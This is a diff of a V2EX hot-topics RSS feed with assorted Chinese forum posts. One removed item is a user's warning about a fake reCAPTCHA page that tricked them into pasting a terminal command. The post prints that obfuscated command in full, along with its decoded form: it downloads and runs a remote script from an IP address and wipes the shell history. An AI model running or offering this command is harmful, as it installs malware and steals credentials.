@@ -4,7 +4,7 @@
     <title>V2EX Hot Topics</title>
     <link>https://www.v2ex.com/?tab=hot</link>
     <description>Hot topics from V2EX</description>
-    <lastBuildDate>Sat, 20 Jun 2026 14:37:15 GMT</lastBuildDate>
+    <lastBuildDate>Sat, 20 Jun 2026 16:10:45 GMT</lastBuildDate>
     <item>
       <title>问一个直击灵魂的问题，你用 AI 做了哪些有意义的工具？</title>
       <link>https://www.v2ex.com/t/1221614</link>
@@ -30,27 +30,6 @@
       <description>最近发现 clash verge rev bug 好多啊， 例如偶尔代理的列表会突然显示空&lt;br /&gt;&lt;br /&gt;有没有推荐下新成长起来的客户端啊&lt;br /&gt;flclash 适合桌面端吗&lt;br /&gt;还有其他推荐吗？&lt;br /&gt;&lt;br /&gt;或者大家按照每个端来给一个极客和小白都比较认可的&lt;br /&gt;&lt;br /&gt;iOS：&lt;br /&gt;android：&lt;br /&gt;win：&lt;br /&gt;macOS：</description>
     </item>
     <item>
-      <title>一个 reCAPTCHA 把我骗到重装系统，分享出来给大家提个醒</title>
-      <link>https://www.v2ex.com/t/1221581</link>
-      <guid>v2ex-1221581</guid>
-      <pubDate>Fri, 19 Jun 2026 15:25:09 GMT</pubDate>
-      <description>&lt;p&gt;昨天想查一下今天龙舟赛的安排，就用 DuckDuckGo 快速搜了一下，点进一个网站。&lt;a href=&quot;https://hkcdba.org/hkidbr&quot; rel=&quot;nofollow&quot;&gt;https://hkcdba.org/hkidbr&lt;/a&gt; （后面查又说是官方网站，是被黑了吗？）&lt;/p&gt;
-&lt;p&gt;打开之后，弹出了标准的 &quot;I&#39;m not a robot&quot; reCAPTCHA 验证。我很自然地就准备开始点图片验证，结果这次等来的压根不是图片，而是直接弹出了一张指引图，一步一步教我怎么打开终端，粘贴进去运行。应该是在我点击验证的时候，就已经把那段命令自动复制到我的剪贴板了。我当时也没多想，平时 github 里粘贴命令运行已经形成肌肉记忆了，鬼使神差地打开终端，直接粘贴，按下了回车。&lt;/p&gt;
-&lt;p&gt;运行的命令是这样的&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;echo &#39;I am not a robot - reCAPTCHA Verification ID: 432426&#39; &amp;amp;&amp;amp; echo &#39;ZXhwb3J0IFNSQ19VUkw9J2h0dHBzOi8vaGtjZGJhLm9yZy8nICYmIChjZCAvdG1wICYmIGN1cmwgLWtmc1NMICJodHRwOi8vNjIuNjAuMTU1LjE0My80ZjZiYjEyZjk4NDI4N2Q/Zm9yY2U9MSIgLW8gLk5lcWdnZiAmJiBiYXNoIC5OZXFnZ2YgJiYgcm0gLWYgLk5lcWdnZikgPiAvZGV2L251bGwgMj4mMSAmIGNsZWFyOyBwcmludGYgJ1wwMzNbM0onOyBoaXN0b3J5IC1kICQoaGlzdG9yeSAxIDI+L2Rldi9udWxsIHwgYXdrICd7cHJpbnQgJDF9JykgMj4vZGV2L251bGw7IGZjIC1wIC9kZXYvbnVsbCAyPi9kZXYvbnVsbDsgcHJpbnRmICdcbiAgXDAzM1szMm1ceGUyXHg5Y1x4OTMgVmVyaWZpY2F0aW9uIHN1Y2Nlc3NmdWxcMDMzWzBtXG5cbic=&#39; | base64 -D 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;把里面的 base64 解析出来是这个&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&quot;language-sh&quot;&gt;export SRC_URL=&#39;https://hkcdba.org/&#39; &amp;amp;&amp;amp; (cd /tmp &amp;amp;&amp;amp; curl -kfsSL &quot;http://62.60.155.143/4f6bb12f984287d?force=1&quot; -o .Neqggf &amp;amp;&amp;amp; bash .Neqggf &amp;amp;&amp;amp; rm -f .Neqggf) &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp; clear; printf &#39;\033[3J&#39;; history -d $(history 1 2&amp;gt;/dev/null | awk &#39;{print $1}&#39;) 2&amp;gt;/dev/null; fc -p /dev/null 2&amp;gt;/dev/null; printf &#39;\n  \033[32m\xe2\x9c\x93 Verification successful\033[0m\n\n&#39;%
-
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;命令执行完，终端里立刻用绿色大字打印出了 &quot;Verification successful&quot;。回到网页并没有变化。&lt;/p&gt;
-&lt;p&gt;但真正的异常才刚刚开始。没过几秒钟，系统突然弹出一个提示，说有一个后台任务正在运行，而且这个任务被伪装成了系统更新进程 &quot;softwareupdate&quot;。&lt;/p&gt;
-&lt;p&gt;我赶紧去取消这个后台活动，但紧接着，没过多久屏幕上又弹出一个无法关闭的对话框，声称“系统软件已损坏”，要求我输入用户密码。&lt;/p&gt;
-&lt;p&gt;这时候我已经完全清醒了，不敢再输入任何东西。那个弹窗关也关不掉，我赶紧电源键强制重启。&lt;/p&gt;
-&lt;p&gt;重启之后问了下 deepseek ，然后赶紧把网络给掐了。后面查 plist ，发现有个伪装的 softwareupdate 的配置。然后今天预约了天才吧把全盘格式化重装了个系统。&lt;/p&gt;
-</description>
-    </item>
-    <item>
       <title>我明明选的是 GLM-4.7，他告诉我他是 Claude。</title>
       <link>https://www.v2ex.com/t/1221642</link>
       <guid>v2ex-1221642</guid>
@@ -65,13 +44,6 @@
 &lt;p&gt;我是 Claude ，是由 Anthropic 开发的大型语言模型。&lt;/p&gt;
 &lt;p&gt;我已经分不清谁是谁了。&lt;/p&gt;
 </description>
-    </item>
-    <item>
-      <title>iPhone17 凌晨异常使用蜂窝数据欠费 500 多</title>
-      <link>https://www.v2ex.com/t/1221604</link>
-      <guid>v2ex-1221604</guid>
-      <pubDate>Sat, 20 Jun 2026 02:02:19 GMT</pubDate>
-      <description>早晨五点被密集几十条短信吵醒，一看吓一跳，短信显示流量超出 540 元。（ 8 元保号套餐，600 元流量超出强制断网）&lt;br /&gt;查了一下记录，从一点开始到 5 点结束一直在疯狂跑流量，手机一直在充电没在使用&lt;br /&gt;看了设置里的记录显示 shadowrocket 使用了 25G&lt;br /&gt;很多异常点:&lt;br /&gt;1.家里全屋 wifi7 覆盖，为啥会突然走流量&lt;br /&gt;2.手机没有后台上传下载的任务，我经常重置网络设置，大部分 app 都是默认没有网络权限的，手机里没有网盘之类的 app ，即使有，再设置里流量统计也会有体现&lt;br /&gt;3.小火箭一直是规则模式链接，不知道为啥会在凌晨异常暴力传输数据，3 小时 25G 流量 ，小火箭默认不打开日志记录，所以没办法查到什么&lt;br /&gt;4.白天也有异常情况，在外面逛街的时候联通卡突然提示流量耗光，这才切的移动卡，因为移动卡里还有 7G 赠送的流量&lt;br /&gt;5.手机系统是 iOS27 beta1&lt;br /&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://i.imgur.com/ZIjABgT.jpeg&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://i.imgur.com/ZIjABgT.jpeg&quot; class=&quot;embedded_image&quot; rel=&quot;noreferrer&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://i.imgur.com/YgAJ22W.jpeg&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://i.imgur.com/YgAJ22W.jpeg&quot; class=&quot;embedded_image&quot; rel=&quot;noreferrer&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;后续打了 10086 客服，拉扯一会退了 70% 的费用，送了 20G 流量。</description>
     </item>
     <item>
       <title>Vibe Coding 了两年，分享一下我对于 Vibe 的感想。</title>
@@ -116,22 +88,18 @@
 </description>
     </item>
     <item>
+      <title>iPhone17 凌晨异常使用蜂窝数据欠费 500 多</title>
+      <link>https://www.v2ex.com/t/1221604</link>
+      <guid>v2ex-1221604</guid>
+      <pubDate>Sat, 20 Jun 2026 02:02:19 GMT</pubDate>
+      <description>早晨五点被密集几十条短信吵醒，一看吓一跳，短信显示流量超出 540 元。（ 8 元保号套餐，600 元流量超出强制断网）&lt;br /&gt;查了一下记录，从一点开始到 5 点结束一直在疯狂跑流量，手机一直在充电没在使用&lt;br /&gt;看了设置里的记录显示 shadowrocket 使用了 25G&lt;br /&gt;很多异常点:&lt;br /&gt;1.家里全屋 wifi7 覆盖，为啥会突然走流量&lt;br /&gt;2.手机没有后台上传下载的任务，我经常重置网络设置，大部分 app 都是默认没有网络权限的，手机里没有网盘之类的 app ，即使有，再设置里流量统计也会有体现&lt;br /&gt;3.小火箭一直是规则模式链接，不知道为啥会在凌晨异常暴力传输数据，3 小时 25G 流量 ，小火箭默认不打开日志记录，所以没办法查到什么&lt;br /&gt;4.白天也有异常情况，在外面逛街的时候联通卡突然提示流量耗光，这才切的移动卡，因为移动卡里还有 7G 赠送的流量&lt;br /&gt;5.手机系统是 iOS27 beta1&lt;br /&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://i.imgur.com/ZIjABgT.jpeg&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://i.imgur.com/ZIjABgT.jpeg&quot; class=&quot;embedded_image&quot; rel=&quot;noreferrer&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;a target=&quot;_blank&quot; href=&quot;https://i.imgur.com/YgAJ22W.jpeg&quot; rel=&quot;nofollow noopener&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://i.imgur.com/YgAJ22W.jpeg&quot; class=&quot;embedded_image&quot; rel=&quot;noreferrer&quot;&gt;&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;后续打了 10086 客服，拉扯一会退了 70% 的费用，送了 20G 流量。</description>
+    </item>
+    <item>
       <title>航班因乘客违规使用充电宝迫降，此人是不是这辈子就差不多了？</title>
       <link>https://www.v2ex.com/t/1221647</link>
       <guid>v2ex-1221647</guid>
       <pubDate>Sat, 20 Jun 2026 08:44:46 GMT</pubDate>
       <description>英国航班 BA271 飞行中一名乘客用充电宝给手机充电。突然充电宝爆炸起火，机上乘客以为遇到恐袭。最终充电宝火灾烧毁了一个座椅后被乘务组扑灭，飞机就近紧急降落。&lt;br /&gt;&lt;br /&gt;这个飞行中使用充电宝充电的乘客要承担多少责任？会不会要陪天文数字的钱（飞机修复，航班费用，其他旅客延误赔偿等）？有没有可能设计刑事责任？</description>
-    </item>
-    <item>
-      <title>刚转行做猎头，你们最想在招聘信息里面看到什么？</title>
-      <link>https://www.v2ex.com/t/1221582</link>
-      <guid>v2ex-1221582</guid>
-      <pubDate>Fri, 19 Jun 2026 15:33:02 GMT</pubDate>
-      <description>&lt;p&gt;大家好，我是刚转行做猎头的新人。&lt;/p&gt;
-&lt;p&gt;以前我也在 V2EX 潜水，知道大家最烦那种连 JD 都说不清的招聘信息。所以今天发帖不为别的，就是想跟各位交个底——我现在手头有一些技术岗的机会，但我不想硬推，我想先听听你们的声音。&lt;/p&gt;
-&lt;p&gt;你们看招聘信息时，最想第一时间看到什么？是薪资范围的真实区间，还是技术栈的具体版本，或者团队氛围、加班情况？面试流程有几轮？有没有笔试？ hc 多不多？这些问题你们尽管扔过来，我用人话回答，绝不复制粘贴官话。&lt;/p&gt;
-&lt;p&gt;我就想做个不一样的猎头，把信息聊透，帮大家节省时间。有任何想问的，直接在帖子里回，每条我都看。谢谢各位。&lt;/p&gt;
-</description>
     </item>
     <item>
       <title>[陈恳求助] 现在能买的 VPS 线路有哪些</title>
@@ -143,6 +111,24 @@
 &lt;p&gt;奈何搬瓦工现在有点贵，💲49/季度，也没有什么优惠码，有一点点舍不得，预算在 600 左右/年。&lt;/p&gt;
 &lt;p&gt;刚刚接触自建，陈恳求助各位佬，有没有什么推荐的线路吗？ 想稳定用下去的。&lt;/p&gt;
 &lt;p&gt;如果各位佬有想放生的线路，也可以加价收一下，论坛小透明在此感谢各位大佬。&lt;/p&gt;
+</description>
+    </item>
+    <item>
+      <title>没天理啦。 Claude 昨天更新了额度。 今天又重置额度变成 0% 啦。</title>
+      <link>https://www.v2ex.com/t/1221598</link>
+      <guid>v2ex-1221598</guid>
+      <pubDate>Sat, 20 Jun 2026 00:55:02 GMT</pubDate>
+      <description>早知道昨天就把额度给用光了，我还有 60% 没用。 我滴个天啊，后悔啊。Claude ，现在到底是什么情况啊？是不是每个礼拜都要格外重置一次啊？</description>
+    </item>
+    <item>
+      <title>发现自己越来越不爱社交了，这是变成熟还是变麻木？</title>
+      <link>https://www.v2ex.com/t/1221608</link>
+      <guid>v2ex-1221608</guid>
+      <pubDate>Sat, 20 Jun 2026 02:47:44 GMT</pubDate>
+      <description>&lt;p&gt;最近有个挺明显的感觉：以前周末还会约朋友吃饭、打球、随便逛逛，现在下班后只想回家待着。&lt;/p&gt;
+&lt;p&gt;不是完全没有朋友，也不是讨厌别人，就是每次想到要出门、聊天、维持情绪，就会觉得累。很多饭局聊来聊去也是房子、工作、孩子、收入，聊完没有放松，反而更疲惫。&lt;/p&gt;
+&lt;p&gt;但另一面又会担心，一直这样下去，会不会慢慢把自己的生活圈缩得太小？以后真遇到事情，身边能说话的人越来越少。&lt;/p&gt;
+&lt;p&gt;大家有没有类似阶段？你们是顺其自然，还是会刻意维持一些社交？&lt;/p&gt;
 </description>
     </item>
   </channel>
